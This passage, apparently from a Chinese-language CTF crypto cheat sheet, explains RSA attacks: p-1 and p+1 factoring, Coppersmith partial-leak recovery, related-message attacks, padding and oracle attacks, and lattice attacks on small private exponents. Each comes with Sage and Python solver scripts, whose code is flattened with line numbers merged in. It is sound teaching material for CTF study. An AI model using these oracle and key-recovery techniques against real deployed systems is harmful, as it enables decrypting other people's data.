$ed_p=(k-1)(p-1)+p$，即 $ed_pq=(k-1)(N-q)+N$。 设 $x,y$ 为参数，则多项式 $f(x,y)=x(N-y)+N$ 在模 $e$ 下存在根 $(x_0,y_0)=(k-1,q)$，用coppersmith attack可解。 ​ 光滑数p-1 光滑Pollard’s p-1分解算法。 如果一个整数的所有素因子都不大于 $B$，我们称这个数为 $B$-Smooth 数。 设 $p-1$ 是 $B$-Smooth 的，可设 $p-1=p_1p_2 \\cdots p_n(\\forall 1 \\leq i \\leq n,p_i \\leq B)$， 若 $p_1,p_2, \\cdots ,p_n$ 两两不同，则 $p_1p_2 \\cdots p_n \\mid B! \\Rightarrow (p-1) \\mid B! \\Rightarrow B!=k(p-1)$。 因此 $a^{B!} \\equiv a^{k(p-1)} \\equiv 1 \\pmod p$，假设 $N=pq$，计算 $\\gcd(a^{B!}-1，N)$，只要结果大于 $0$ 小于 $N$，那么结果就为 $p$。 12345678910111213from gmpy2 import *a = 2k = 2N = while True: a = powmod(a, k, N) res = gcd(a-1, N) if res != 1 and res != N: q = N // res print(&quot;p =&quot;,res) print(&quot;q =&quot;,q) break k += 1 p+1 光滑William’s p+1分解算法。 12345678910111213141516171819def mlucas(v, a, n): &quot;&quot;&quot; Helper function for williams_pp1(). Multiplies along a Lucas sequence modulo n. &quot;&quot;&quot; v1, v2 = v, (v**2 - 2) % n for bit in bin(a)[3:]: v1, v2 = ((v1**2 - 2) % n, (v1*v2 - v) % n) if bit == &quot;0&quot; else ((v1*v2 - v) % n, (v2**2 - 2) % n) return v1for v in count(1): for p in primegen(): e = ilog(isqrt(n), p) if e == 0: break for _ in xrange(e): v = mlucas(v, p, n) g = gcd(v-2, n) if 1 &lt; g &lt; n: return g # g|n if g == n: break ​ Coppersmith定理指出在一个 $e$ 阶的 $\\bmod n$ 多项式 $f(x)$ 中，如果有一个根小于 $n^{\\frac{1}{e}}$，就可以运用一个 $O(\\log n)$ 的算法求出这些根。 Coppersmith攻击（已知p的高位攻击）知道 $p$ 的高位为 $p$ 的位数的约$\\frac12$时即可。 12345678910111213141516#Sagen = p4 = #p去0的剩余位pbits = 1024kbits = pbits - p4.nbits()print(p4.nbits())p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4roots = f.small_roots(X=2^kbits, beta=0.4)if roots: p = p4 + int(roots[0]) q = n//p print(f&#x27;n: &#123;n&#125;&#x27;) print(f&#x27;p: &#123;p&#125;&#x27;) print(f&#x27;q: &#123;q&#125;&#x27;) ​ Coppersmith攻击（已知m的高位攻击）这里我们假设我们首先加密了消息 $m$，如下 $C\\equiv m^e \\bmod N$ 并且我们假设我们知道消息 $m$ 的很大的一部分 $m_0$，即 $m=m_0+x$，但是我们不知道 $x$。那么我们就有可能通过该方法进行恢复消息。这里我们不知道的 $x$ 其实就是多项式的根，需要满足 Coppersmith 的约束。 可以参考 https://github.com/mimoo/RSA-and-LLL-attacks 。 $e$ 足够小，且部分明文泄露时，可以采用Coppersmith单变量模等式的攻击，如下： $c=m^{e}\\bmod n=(mbar+x_{0})^{e}\\bmod n$，其中 $mbar = (m &gt;&gt; k\\text{bits}) &lt;&lt; k\\text{bits}$ 当 $\\vert x_{0}\\vert\\leq N^{\\frac{1}{e}}$ 时，可以在 $\\log N$ 和 $e$ 的多项式时间内求出 $x_0$。 12345678910111213#Sagen = e = c = mbar = kbits = beta = 1nbits = n.nbits()print(&quot;upper &#123;&#125; bits of &#123;&#125; bits is given&quot;.format(nbits - kbits, nbits))PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (mbar + x)^e - cx0 = f.small_roots(X=2^kbits, beta=1)[0] # find root &lt; 2^kbits with factor = nprint(&quot;m:&quot;, mbar + x0) ​ Coppersmith攻击（已知d的低位攻击）如果知道 $d$ 的低位，低位约为 $n$ 的位数的 $\\frac14$ （$\\frac{n.n\\text{bits}()}{4}$）就可以恢复 $d$。 123456789101112131415161718192021222324252627282930313233#Sagedef partial_p(p0, kbits, n): PR.&lt;x&gt; = PolynomialRing(Zmod(n)) nbits = n.nbits() f = 2^kbits*x + p0 f = f.monic() roots = f.small_roots(X=2^(nbits//2-kbits), beta=0.4) # find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.4 if roots: x0 = roots[0] p = gcd(2^kbits*x0 + p0, n) return ZZ(p)def find_p(d0, kbits, e, n): X = var(&#x27;X&#x27;) for k in range(1, e+1): results = solve_mod([e*d0*X - k*X*(n-X+1) + k*n == X], 2^kbits) for x in results: p0 = ZZ(x[0]) p = partial_p(p0, kbits, n) if p and p != 1: return pif __name__ == &#x27;__main__&#x27;: n = e = c = d0 = beta = 0.5 nbits = n.nbits() kbits = d0.nbits() print(&quot;lower %d bits (of %d bits) is given&quot; % (kbits, nbits)) p = int(find_p(d0, kbits, e, n)) print(&quot;found p: %d&quot; % p) q = n//int(p) print(&quot;d:&quot;, inverse_mod(e, (p-1)*(q-1))) 变种1：$n=p\\cdot q\\cdot r$，已知 $n,p,d=\\text{inv}(e,\\varphi(n)),e,c$ $k(p-1)\\rightarrow k’,qr\\rightarrow n’,q+r\\rightarrow s$ $ed_{0}\\equiv 1+k’(n’-s+1) \\pmod {2^{d_{0}.n\\text{bits}()}}\\quad (1)$ $q^{2}-sq+n’\\equiv 0 \\pmod {2^{d_{0}.n\\text{bits}()}}\\quad (2)$ 联立可得，$(ed_{0}-1-k’n’-k’)q+k’q^{2}+k’n’\\equiv 0 \\pmod {2^{d_{0}.n\\text{bits}()}}$ 即求解同余方程可得 $q$ 的低 $size(d0)$ 位，本来是个partial d的coppersmith问题，但因为step1求解同余方程后得到的 $q$ 已是完整的 $q$，所以无需后续的coppersmith。 参考：Dragon CTF 2019 - RSA Chained 12345678910111213141516171819202122#Sagedef find_p(d0, kbits, e, n, p): X = var(&#x27;X&#x27;) for k in range(1, e + 1): k_dot = k * (p - 1) results = solve_mod([e * d0 * X - k_dot * X * (n - X + 1) + k_dot * n == X], 2^kbits) for x in results: q = ZZ(x[0]) if n % q == 0: return q return Nonen = ... # q * rp = c = d0 = e = kbits = d0.nbits()q = find_p(d0, kbits, e, n, p)phi = (p - 1) * (q - 1) * (n // q - 1)d = inverse_mod(e, phi)print(bytes.fromhex(hex(pow(c, d, p * n))[2:])) ​ Coppersmith攻击（已知N一个因子的高位，部分p）当我们知道一个公钥中模数 $N$ 的一个因子的较高位时，我们就有一定几率来分解 $N$。 参考 https://github.com/mimoo/RSA-and-LLL-attacks 。 关注下面的代码： 1234567beta = 0.5dd = f.degree()epsilon = beta / 7mm = ceil(beta**2 / (dd * epsilon))tt = floor(dd * mm * ((1/beta) - 1))XX = ceil(N**((beta**2/dd) - epsilon)) + 1000000000000000000000000000000000roots = coppersmith_howgrave_univariate(f, N, beta, mm, tt, XX) 其中， 必须满足 $q\\ge N^{beta}$，所以这里给出了 $beta=0.5$，显然两个因数中必然有一个是大于的。 XX 是 $f(x)=q′+x$ 在模 $q$ 意义下的根的上界，自然我们可以选择调整它，这里其实也表明了我们已知的 $q′$ 与因数 $q$ 之间可能的差距。 123456789101112131415#Sagen = e = c = pbar = kbits = print(&quot;upper %d bits (of %d bits) is given&quot; % (pbar.nbits()-kbits, pbar.nbits()))PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + pbarx0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root &lt; 2^kbits with factor &gt;= n^0.4p = x0 + pbarprint(&quot;p:&quot;, p)q = n // int(p)d = inverse_mod(e, (p-1)*(q-1))print(&quot;m:&quot;, pow(c, d, n)) 注： sage的small_root传参X不能过大，需自行判断阈值并调整（如果X过大，即使存在X内的解，也无法求出）； 比如 $p$ 的低位泄露时因为不确定缺失高位的具体比特数，所以要在 $2^{\\frac{n.n\\text{bits}()}{2}−k\\text{bits}}$ 附近作X的阈值估计； 无法确定拿到的 $p$ 是否大于 $q$，所以对 $\\beta=0.5$ 进行调整至 $0.4$。 ​ Coppersmith’s Short-pad Attack &amp; Related Message Attack（Franklin-Reiter攻击）目前在大部分消息加密之前都会进行 padding，但是如果 padding 的长度过短（$m \\in (0,\\lfloor\\frac{n.n\\text{bits}()}{e^2}\\rfloor]$），也有可能被很容易地攻击。 这里所谓 padding 过短，其实就是对应的多项式的根会过小。 当 Alice 使用同一公钥对两个具有某种线性关系的消息 $M_1$ 与 $M_2$ 进行加密，并将加密后的消息 $C_1$，$C_2$ 发送给了 Bob 时，我们就可能可以获得对应的消息 $M_1$ 与 $M_2$ 。这里我们假设模数为 $N$，两者之间的线性关系如下： $M_1 \\equiv f(M_2) \\bmod N$ 其中 $f$ 为一个线性函数，比如说 $f=ax+b$。 在具有较小错误概率下的情况下，其复杂度为 $O(e\\log^2N)$。 这一攻击由 Franklin与Reiter 提出。 1234567891011121314151617181920#脚本1#Sageimport binasciidef attack(c1, c2, n, e): PR.&lt;x&gt;=PolynomialRing(Zmod(n)) # replace a,b,c,d g1 = (a*x+b)^e - c1 g2 = (c*x+d)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]c1 =c2 =n =e =m1 = attack(c1, c2, n, e)print(binascii.unhexlify(&quot;%x&quot; % int(m1))) 123456789101112131415161718192021222324252627282930313233343536#脚本2#Sagedef short_pad_attack(c1, c2, e, n): PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n)) PRx.&lt;xn&gt; = PolynomialRing(Zmod(n)) PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() kbits = n.nbits()//(2*e*e) diff = h.small_roots(X=2^kbits, beta=0.4)[0] # find root &lt; 2^kbits with factor &gt;= n^0.4 return diffdef related_message_attack(c1, c2, diff, e, n): PRx.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]if __name__ == &#x27;__main__&#x27;: n = e = c1 = c2 = diff = short_pad_attack(c1, c2, e, n) print(&quot;difference of two messages is %d&quot; % diff) m1 = related_message_attack(c1, c2, diff, e, n) print(&quot;m1:&quot;, m1) print(&quot;m2:&quot;, m1 + diff) 变种1：$e$ 较大。使用Half GCD降低时间复杂度。 变种2： $c_i=(a_im+b_i)^e \\pmod {n_i}$ 用CRT计算系数 $T_i$ 使得 $T_i \\equiv 1 \\pmod{n_i},T_i \\equiv 0 \\pmod{n_{j \\neq i}}$， 则可建立多项式为 $f(x) = \\sum_{i} T_i [ (a_i x + b_i)^e - c_i]$，符合 $f(m) \\equiv 0 \\pmod{n_i}$， 故 $m$ 是 $f(m) \\equiv 0 \\pmod N$ 的一个根，其中 $N= \\prod_i n_i$。 如果 $m &lt; \\left (\\prod_i n_i \\right)^{1/e} = M^{1/\\deg{f(x)}}$，可以使用coppersmith找出 $m$。 参考： Security Fest 2022 - really_sick_æsthetic PlaidCTF 2017 - Multicast CakeCTF 2021 - Party Ticket ​ RSA Hastad Attack with non-linear padding and different public keys（带非线性padding和不同公钥的广播攻击）适用情况：$m$ 经 $k$ 次非线性padding处理后，分别用 $k$ 组 $(N_i,e_i)$ 加密后得 $k$ 组 $c_i$。 参考：2020年羊城杯 - Invitation 1234567891011121314151617181920212223242526272829303132333435363738394041#Sage#e=3, padding: m²+(3^431)kdef linearPaddingHastads(cArray,nArray,aArray,bArray,eArray,eps): if(len(cArray) == len(nArray) == len(aArray) == len(bArray) == len(eArray)): for i in range(4): cArray[i] = Integer(cArray[i]) nArray[i] = Integer(nArray[i]) aArray[i] = Integer(aArray[i]) bArray[i] = Integer(bArray[i]) eArray[i] = Integer(eArray[i]) TArray = [-1]*4 for i in range(4): arrayToCRT = [0]*4 arrayToCRT[i] = 1 TArray[i] = crt(arrayToCRT,nArray) P.&lt;x&gt; = PolynomialRing(Zmod(prod(nArray))) gArray = [-1]*4 for i in range(4): gArray[i] = TArray[i]*(pow(aArray[i]*x**2 + bArray[i],eArray[i]) - cArray[i]) g = sum(gArray) g = g.monic() roots = g.small_roots(epsilon=eps) if(len(roots)== 0): print(&quot;No Solutions found!&quot;) return -1 return roots else: print(&quot;Input error!&quot;)def nonLinearPadding(): eArr = [3 for i in range(4)] nArr = [] cArr = [] aArr = [1 for i in range(4)] bArr = [i * 3 ** 431 for i in [3,8,10,11]] msg = linearPaddingHastads(cArr,nArr,aArr,bArr,eArr,eps=1/20) for i in msg: print(bytes.fromhex(hex(i)[2:])) if __name__ == &#x27;__main__&#x27;: nonLinearPadding() ​ 选择明/密文攻击选择明文攻击适用情况：对输入的任意明文服务器返回 RSA 加密结果，可以通过选择明文攻击来获取 $n$。 首先发送 $2$，让服务器进行加密，返回 $c_2=2^e \\bmod n$； 继续发送 $2^2$，让服务器进行加密，返回 $c_4=4^e \\bmod n$； 不妨设 $2^e=a+bn$，有 $c_2=(a+bn) \\bmod n=a$，$c_4=(a^2+2abn+b^2n^2) \\bmod n = a^2 \\bmod n$， 所以 $c_2^2$ 和 $c_4$ 模 $n$ 同余，即 $c_2^2-c_4=kn$，同理 $c_2^3-c_8=k’n$， 一般来说 $a^2$ 比 $n$ 大，所以 $k \\neq 0$。 同理还可以构造更多的例子取他们的公因数，来更加确定地找 $n$。 123456789101112131415161718192021222324252627282930import gmpy2def get_n(): nset = [] c2 = server_encode(2) c4 = server_encode(4) c8 = server_encode(8) nset.append(c2 * c2 - c4) nset.append(c2 * c2 * c2 - c8) c3 = server_encode(3) c9 = server_encode(9) c27 = server_encode(27) nset.append(c3 * c3 - c9) nset.append(c3 * c3 * c3 - c27) c5 = server_encode(5) c25 = server_encode(25) c125 = server_encode(125) nset.append(c5 * c5 - c25) nset.append(c5 * c5 * c5 - c125) n = nset[0] for x in nset: n = gmpy2.gcd(x, n) while n % 2 == 0: n //= 2 while n % 3 == 0: n //= 3 while n % 5 == 0: n //= 5 print(&#x27;n =&#x27;, n) return n 选择密文攻击适用情况：可以构造任意密文并获得对应明文，通过选择密文攻击获得特定的明文。 假设服务器创建了密文 $c=m^e \\bmod n$，并且把 $c$ 发送给用户，用户可以发送任意密文服务器返回解密后的明文，可以通过以下方法求出 $m$： 选择任意的 $x$ 与 $n$ 互素； 计算 $y=cx^e \\bmod n$； 由于可以进行选择密文攻击，可以求得 $y$ 对应的解密结果 $z=y^d$； 则 $z=y^d=(cx^e)^d=c^dx=mx \\bmod n$，由于 $x$ 与 $n$ 互素，容易求得相应逆元，进而可以得到 $m$。 123456789101112from Crypto.Util.number import *def get_M(): X = getPrime(5) Y = (c * (X ** e)) % n Z = server_decode(Y) i = 0 while True: M = (n * i + Z) // X if &#x27;flag&#x27; in long_to_bytes(M): print(long_to_bytes(M)) break Parity Oracle AttackLSB Oracle Attack（Least Significant Bit Oracle Attack ）适用情况：可以选择密文并泄露明文的最低位（奇偶性）。 服务器会对一个给定的密文进行解密，并且会检查解密的明文的奇偶性，并根据奇偶性返回相应的值，比如1表示奇数，0表示偶数。那么给定一个加密后的密文，只需要 $\\log_2n$ 次就可以知道这个密文对应的明文消息。 假设 $c=m^e \\bmod n$，第一次时，构造密文 $c \\cdot 2^e \\bmod n=(2m)^e \\bmod n$，服务器解密后得到 $2m \\bmod n$。 这里： $2m$ 是偶数，它的幂次也是偶数； $n$ 是奇数，因为它是由两个大素数相乘得到。 那么： 服务器返回奇数，即 $2m \\bmod n$ 为奇数，则说明 $2m&gt;n$，且减去了奇数个 $n$，又因为 $2m&lt;2n$，因此减去了一个 $n$，即 $\\frac{n}{2}\\leq m \\lt n$； 服务器返回偶数，则 $2m&lt;n$，即 $0 \\leq m \\lt \\frac{n}{2}$。 第二次时，构造密文 $c \\cdot 4^e \\bmod n$，服务器解密后得到 $4m \\bmod n$，判断其奇偶性可以知道 $m$ 和 $\\frac{n}{4}$ 的大小关系。 以此类推，第 $i$ 次时，构造密文 $c \\cdot 2^{ie} \\bmod n$，服务器解密后得到 $2^im \\bmod n$，判断其奇偶性可以知道 $m$ 和 $\\frac{n}{2^i}$ 的大小关系。 所以我们就有了一个二分算法，可以在 $\\log_2n$ 次内将 $m$ 的范围逼近到一个足够狭窄的空间。 假设服务器返回 b，那么可以归纳为： 1234567L = 0R = nfor i in range(1024): if b: L = (L+R) // 2 else: R = (L+R) // 2 由于此处有大量整除运算，所以最好用 decimal 库进行精确计算，否则最后结果很可能会出错。decimal.getcontext().prec 用来设定精度。 12345678910111213141516from Crypto.Util.number import *import decimaldef get_flag(): k = n.bit_length() decimal.getcontext().prec = k L = decimal.Decimal(0) R = decimal.Decimal(int(n)) for i in range(k): c = (c * pow(2, e, n)) % n recv = server_decode(c) if recv == 1: L = (L + R) // 2 else: R = (L + R) // 2 print(long_to_bytes(int((R)))) 更多信息可参考：RSA Least-Significant-Bit Oracle Attack 和 RSA least significant bit oracle attack 。 1234567891011121314151617import decimaldef oracle(): return lsb == &#x27;odd&#x27;def partial(c, e, n): k = n.bit_length() decimal.getcontext().prec = k # for &#x27;precise enough&#x27; floats lo = decimal.Decimal(0) hi = decimal.Decimal(n) for i in range(k): if not oracle(c): hi = (lo + hi) // 2 else: lo = (lo + hi) // 2 c = (c * pow(2, e, n)) % n # print i, int(hi - lo) return int(hi) MSB Oracle Attack（Most Significant Bit Oracle Attack ）适用情况：可以选择密文并泄露明文的最高位（奇偶性）。 假设远程提供一个解密服务，但是只返回明文的最高字节，并且明文的形式是64字节，高位用 \\x00 填充。 将加密的内容拿去解密会得到 $m$，但是回显最高位是 \\x00，构造密文 $c \\cdot 2^e$，解密会得到 $2m \\bmod n$， 不断构造密文 $c \\cdot 2^{ie}$，当最高位不是 \\x00 时，记录下值为 $x$，则说明 $mx&gt;2^{\\text{kbit}}$， 然后再相应缩小 $x$ ，可以利用二分法，比如当第一次拿到 $mx&gt;2^{\\text{kbit}}$，那么有 $m(\\frac{x}{2})&lt;2^{\\text{kbit}}$，因此新的 $x’$ 必定满足 $\\frac{x}{2} \\lt x’ \\lt x$，接着尝试 $\\frac{x+\\frac{x}{2}}{2}$ 就好。 最终可以找到一个 $X$，满足 $mX \\lt 2^{\\text{kbit}}$ 且 $m(X+1) \\gt 2^{\\text{kbit}}$，由于是整除，所以会有误差，最后的 $m$ 在 $\\frac{2^{\\text{kbit}}}{x}$ 附近。 参考：Pwnhub - pkcs4 Byte Oracle Attack适用情况：可以选择密文并泄露最后一个字节。 服务器会对一个给定的密文进行解密，并且会给出明文的最后一个字节。那么给定一个加密后的密文，只需要 $\\log_{256}n$ 次就可以知道这个密文对应的明文消息。 这是 RSA Parity Oracle 的扩展，既然可以泄露出最后一个字节，那么按道理获取密文对应明文的次数应该可以减少。 假设 $c=m^e \\bmod n$，第一次时，构造密文 $c \\cdot 256^e \\bmod n=(256m)^e \\bmod n$，服务器解密后得到 $256m \\bmod n$。 这里： $256m$ 是偶数，它的幂次也是偶数； $n$ 是奇数，因为它是由两个大素数相乘得到。 由于 $m=c^d \\bmod n$，所以 $m \\lt n$，那么：$256m \\bmod n=256m-kn$，$(k&lt;256)$， 而且对于两个不同的 $k_1,k_2$，有：$(256m-k_1n) \\bmod 256 \\neq (256m-k_2n) \\bmod 256$， 同时 $256m-kn$ 的最后一个字节其实就是 $-kn$ 在模 $256$ 的情况下获取的。 那么，可以首先枚举出 $0 \\sim 255$ 情况下的最后一个字节，构造一个 $k$ 和最后一个字节的映射表 $\\text{M}$。 当服务器返回最后一个字节，可以根据上述构造的映射表 $\\text{M}$ 得知 $k$，即减去了 $k$ 个 $n$，即 $kn \\leq 256m \\leq (k+1)n$。 以此类推，第 $i$ 次时，构造密文 $c \\cdot 256^{ie} \\bmod n$，服务器解密后得到 $256^im \\bmod n = 256^im-kn$，即： $kn \\leq 256^im \\leq (k+1)n$， $\\frac{kn}{256^i} \\leq m \\leq \\frac{(k+1)n}{256^i}$。 那么，可以设初始范围为：$\\frac{M}{n} \\in [L_0,R_0],(L_0=0,R_0=1)$， 第 $i$ 次迭代后：$L_i=L_{i-1}+\\frac{k_i}{256^i},R_i=R_{i-1}+\\frac{k_i+1}{256^i}$。 最后一个问题是迭代的次数，由于明文的最后一个字节可以直接由服务器解密得到，那么只需要限定 $m$ 的范围至 $m_{\\text{max}}-m_{\\text{min}} \\lt 256$，即 $n(R_i-L_i)= \\frac{n}{256^i} \\lt 256$。 例如，假设 $n \\lt 2^{1024}$，由上式可得 $i \\gt 128$。 一般对于这样的 Oracle，最多需要 $\\log_{2^{\\text{bits}}}n$ 次迭代即可确定明文，其中 bits 为泄露的明文 bit 数。RSA Parity Oracle 为 1，RSA Byte Oracle 为 8。 假设服务器返回了 b，那么可以归纳为： 1234567L = 0R = 1for i in range(128): k = mab[b] L = L + k // 256**(i+1) R = L + (k+1）// 256**(i+1)M = L * n 如果不知道 $e$ 但服务器提供任意明文加密服务，可以让服务器加密 $256$，得到 $256^e \\bmod n$。 由于有大量除法运算，为保证精度，将中间过程用 Fraction 库保存为分数。 最后一字节的数据不准确要减掉，从服务器返回精确的最后一字节数据。 其实只要求出 L 下限即可，无需求出 R 上限。 1234567891011121314151617181920from Crypto.Util.number import *from fractions import Fractiondef get_flag(): map = &#123;&#125; for i in range(0, 256): map[-n * i % 256] = i cipher256 = server_encode(256) backup = c L = Fraction(0, 1) R = Fraction(1, 1) for i in range(128): c = c * cipher256 % n b = server_decode(c) k = map[b] L, R = L + Fraction(k, 256**(i+1)), L + Fraction(k+1, 256**(i+1)) m = int(L * n) print(long_to_bytes(m - m % 256 + server_decode(backup))) ​ Common Private Exponent（共私钥指数攻击，d相同）加密用同样的私钥并且私钥比较短，从而导致了加密系统被破解。 假定： $\\begin{cases} e_1d=1+k_1\\varphi(N_1) \\newline e_2d=1+k_2\\varphi(N_2) \\newline {\\vdots} \\newline e_rd=1+k_r\\varphi(N_r) \\end{cases}$ 其中，$N_1 \\lt N_2 \\lt \\cdots \\lt N_r \\lt 2N_1$。 构造格： $B_r=\\begin{bmatrix}{M}&amp;{e_1}&amp;{e_2}&amp;{\\cdots}&amp;{e_{r}}\\newline{0}&amp;{-N_1}&amp;{0}&amp;{\\cdots}&amp;{0}\\newline{0}&amp;{0}&amp;{-N_2}&amp;{\\cdots}&amp;{0}\\newline{\\vdots}&amp;{\\vdots}&amp;{\\vdots}&amp;{\\ddots}&amp;{\\vdots}\\newline{0}&amp;{0}&amp;{0}&amp;{\\cdots}&amp;{-N_r}\\newline\\end{bmatrix}$ 其中 $M=\\lfloor N_r^{\\frac{1}{2}} \\rfloor$。 再利用LLL算法进行规约得到 $\\vert b_1\\vert=Md$，则 $d=\\cfrac{\\vert b_1 \\vert}{M}$，从而解密密文得到明文。 使用条件： $d \\lt N_r^{\\delta_r}，\\delta_r \\lt \\cfrac{1}{2}-\\cfrac{1}{2(r+1)}-\\log_{N_r}{(6)}$ 参考： Lattice Based Attack on Common Private Exponent RSA SCTF 2020 - RSA 1234567891011121314151617181920212223###Sage###from gmpy2 import *e0=n0=c0=e1=n1=c1=e2=n2=c2=M=iroot(int(n2),int(2))[0]a=[0]*4a[0]=[M,e0,e1,e2]a[1]=[0,-n0,0,0]a[2]=[0,0,-n1,0]a[3]=[0,0,0,-n2]Mat = matrix(ZZ,a)Mat_LLL=Mat.LLL()d = abs(Mat_LLL[0][0])/Mprint(bytes.fromhex(hex(pow(c1,int(d),int(n1)))[2:])) ​ 多组低解密指数攻击适用情况：2-4组 $e$，且 $d$ 较小 给定2组 $g=\\gcd(p-1,q-1),\\lambda(n)=\\frac{\\varphi(n)}{g},s=1-p-q$ 且有 $ed-k\\lambda(n)=1$，得到 $edg-kn=g+ks\\quad (1)$ 设 $e_1$ 对应 $k_1$，$e_2$ 对应 $k_2$，则有 $k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1}\\quad (2)$ 由(1)(2)有： $\\left\\{ \\begin{matrix} e_{1}d_{1}g-k_{1}n=g+k_{1}s \\newline k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1} \\newline e_{1}e_{2}d_{1}d_{2}g_{2}-e_{1}d_{1}gk_{2}n-e_{2}d_{2}gk_{1}n+k_{1}k_{2}n^{2}=(g+k_{1}s)(g+k_{2}s) \\end{matrix} \\right.$ 上述等式组也可表示为 $bL_2 =[k_{1}k_{2},k_{2}d_{1}g,k_{1}d_{2}g,d_{1}d_{2}g^{2}]\\cdot\\left[ \\begin{matrix} n &amp; -M_{1}n &amp; 0 &amp; n^{2} \\newline 0 &amp; M_{1}e_{1} &amp; M_{2}e_{1} &amp; -e_{1}n \\newline 0 &amp; 0 &amp; -M_{2}e_{2} &amp; -e_{2}n \\newline 0 &amp; 0 &amp; 0 &amp; e_{1}e_{2} \\end{matrix} \\right] =[k_{1}k_{2}n,M_{1}k_{2}(g+k_{1}s),M_{2}g(k_{2}-k_{1})，(g+k_{1}s)(g+k_{2}s)]$ （其中 $M_{1}=n^{1/2},M_{2}=n^{1+\\alpha_{2}},d\\approx n^{\\alpha_{2}}$） 对部分参数进行上界估计，k上界近似于 $d\\approx N^{\\alpha_{2}}$, $|s|$ 上界 $\\approx N^{1/2}$，$g$ 一般相对极小 因此上面的矩阵表示 $BA=C$ 中，$C$ 的每个元的size都近似 $n^{1+2\\alpha_{2}}$，所以 $|C|\\approx 2\\cdot n^{1+2\\alpha_{2}}$ $B$ 作为格基的格中，最短向量由Minkowski Bounds知 $\\approx \\sqrt{4}\\det(B)^{1/4}\\approx 2\\cdot n^{(13/2+\\alpha_{2})/4}$ 因此只要满足 $n^{1+2\\alpha_{2}}&lt;n^{(13/2+\\alpha_{2})/4}$ 即可将问题转化为SVP（$\\alpha_{2}&lt;\\frac{5}{14}$） 12345678910111213141516171819202122232425262728 from sage.all import *import gmpy2N = e1 = e2 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**0.5) M2 = int( gmpy2.mpz(N)**(1+alpha2) ) D = diagonal_matrix(ZZ, [N, M1, M2, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2], [0, e1, -e1, -e1*N], [0, 0, e2, -e2*N], [0, 0, 0, e1*e2] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi = (x[0,1]/x[0,0]*e1).floor() try: d = inverse_mod( 65537, phi) m = hex(power_mod(c, d, N))[2:] if m.startswith(&#x27;44415343&#x27;): print(i) print(bytes.fromhex(m)) break except: pass 参考：De1CTF 2020 - easyRSA 给定3组 类似2组情况，其中 $b=[k_1k_2k_3,d_1gk_2k_3,k_1d_2gk_3,d_1d_2g^2k_3,k_1k_2d_3g,k_1d_3g,k_2d_3g,d_1d_2d_3g^3]$ $L_3=\\left[\\begin{matrix} 1-N &amp; 0 &amp; N^2 &amp; 0 &amp; 0 &amp; 0 &amp; -N^3 \\newline e_1 &amp; -e_1 &amp; -e_1N &amp; -e &amp; 0 &amp; e_1N &amp; e_1N^2 \\newline 0 &amp; e_2 &amp; -e_2N &amp; 0 &amp; e_2N &amp; 0 &amp; e_2N^2 \\newline 0 &amp; 0 &amp; e_1e_2 &amp; 0 &amp; -e_1e_2 &amp; -e_1e_2 &amp; -e_1e_2N \\newline 0 &amp; 0 &amp; 0 &amp; e_3 &amp; -e_3N &amp; -e_3N &amp; e_3N^3 \\newline 0 &amp; 0 &amp; 0 &amp; 0 &amp; e_1e_3 &amp; 0 &amp; -e_1e_3N \\newline 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; e_2e_3 &amp; -e_2e_3N \\newline 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; e_1e_2e_3 \\end{matrix}\\right] \\times D$ 其中 $D={\\rm diag}(N^{3/2},N,N^{(3/2)+\\alpha_3},N^{1/2},N^{(3/2)+\\alpha_3},N^{1+\\alpha_3},N^{1+\\alpha_3}，1)$ 参考：3kCTF - RSA Textbook 123456789101112131415161718192021222324252627282930313233343536373839404142from sage.all import *import gmpy2N = e1 = e2 = e3 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**(3./2)) M2 = int( gmpy2.mpz(N) ) M3 = int(gmpy2.mpz(N)**(3./2 + alpha2)) M4 = int( gmpy2.mpz(N)**(0.5) ) M5 = int( gmpy2.mpz(N)**(3./2 + alpha2) ) M6 = int( gmpy2.mpz(N)**(1.+alpha2) ) M7 = int( gmpy2.mpz(N)**(1.+alpha2) ) D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2, 0, 0, 0, -N**3], [0, e1, -e1, -e1*N, -e1, 0, e1*N, e1*N**2], [0, 0, e2, -e2*N, 0, e2*N, 0, e2*N**2], [0, 0, 0, e1*e2, 0, -e1*e2, -e1*e2, -e1*e2*N], [0, 0, 0, 0, e3, -e3*N, -e3*N, e3*N**2], [0, 0, 0, 0, 0, e1*e3, 0, -e1*e3*N], [0, 0, 0, 0, 0, 0, e2*e3, -e2*e3*N], [0, 0, 0, 0, 0, 0, 0, e1*e2*e3] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi_ = (e1*x[0,1]/x[0,0]).floor() try: d = inverse_mod( 65537, phi_) m = hex(power_mod(c, d, N))[2:] if m.startswith(&#x27;44415343&#x27;): print(i) print(bytes.fromhex(m)) break except: pass 给定更多组 